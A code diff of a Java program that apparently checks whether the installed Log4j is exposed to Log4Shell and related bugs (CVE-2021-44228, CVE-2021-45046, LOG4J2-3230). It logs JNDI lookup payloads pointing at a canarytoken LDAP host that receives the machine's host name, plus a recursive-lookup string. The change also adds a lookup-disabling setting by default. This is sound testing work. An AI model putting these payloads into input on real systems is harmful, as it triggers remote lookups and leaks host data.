@@ -4,52 +4,61 @@ import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.apache.logging.log4j.core.Core;
-import org.apache.logging.log4j.core.config.DefaultConfiguration;
 
 import java.util.LinkedHashMap;
 import java.util.Map;
 
 public class Main implements Runnable {
-    private final static Map<String, String> GADGETS = new LinkedHashMap<>();
     static {
-        GADGETS.put(
-            "CVE-2021-44228",
-            "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}");
-        GADGETS.put(
-            "LOG4J2-3230",
-            "${${::-${::-$${::-j}}}}");
-
-        System.setProperty("com.sun.jndi.ldap.connect.timeout", "1000");
-        System.setProperty("com.sun.jndi.ldap.read.timeout", "1000");
-        System.setProperty(DefaultConfiguration.DEFAULT_LEVEL, Level.INFO.toString());
+        Map.of(
+            "com.sun.jndi.ldap.connect.timeout", "1000",
+            "com.sun.jndi.ldap.read.timeout", "1000",
+            "org.apache.logging.log4j.level", Level.INFO.toString(),
+            "log4j2.formatMsgNoLookups", Boolean.TRUE.toString()
+        ).forEach((k, v) -> System.setProperty(k, System.getProperty(k, v)));
     }
     private final static Logger LOG = LogManager.getLogger(Main.class);
 
-    private final String[] args;
-    private int arg = 0;
+    private final Map<String, Log> gadgets = new LinkedHashMap<>();
 
     public Main(
         final String[] args
     ) {
-        this.args = args;
-
         version();
+
+        for (int i = 0; i < args.length; i++) {
+            gadgets.put(
+                String.format("args-%d", i),
+                Log.printf(args[i])
+            );
+        }
+        gadgets.put(
+            "CVE-2021-44228",
+            Log.log("${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}")
+        );
+        gadgets.put(
+            "CVE-2021-45046",
+            Log.printf("${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}")
+        );
+        gadgets.put(
+            "LOG4J2-3230",
+            Log.printf("${${::-${::-$${::-j}}}}")
+        );
     }
 
     @Override
     public void run() {
-        GADGETS.forEach(this::trigger);
+        gadgets.forEach(this::trigger);
     }
 
     private void trigger(
         final String description,
-        final String gadget
+        final Log gadget
     ) {
         final long ts = System.currentTimeMillis();
         LOG.info("Triggering {}", description);
-        LOG.info("Trigger: " + (args.length > arg ? args[arg] : gadget));
+        gadget.invoke(LOG);
         LOG.info("That took {}ms", System.currentTimeMillis() - ts);
-        arg++;
     }
 
     private void version() {
